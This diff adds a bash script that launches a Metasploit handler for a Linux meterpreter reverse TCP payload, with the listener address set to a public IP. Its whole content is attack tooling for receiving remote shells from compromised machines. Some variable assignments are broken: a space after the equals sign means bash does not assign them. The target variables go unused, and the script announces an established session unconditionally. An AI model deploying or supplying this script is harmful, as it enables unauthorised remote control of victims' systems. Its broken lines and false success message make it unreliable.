@@ -1,0 +1,24 @@
+#!/bin/bash
+
+# Target IP and port
+
+target_ip= 127.0.0.1
+target_port= 1234
+
+# Payload options
+payload="linux/x64/meterpreter_reverse_tcp"
+lhost= 104.28.219.8
+lport= 1234
+
+# Start Metasploit console
+msfconsole -q << EOF
+use exploit/multi/handler
+set PAYLOAD $payload
+set LHOST $lhost
+set LPORT $lport
+set ExitOnSession false
+exploit -j
+EOF
+
+echo "Meterpreter session established."
+
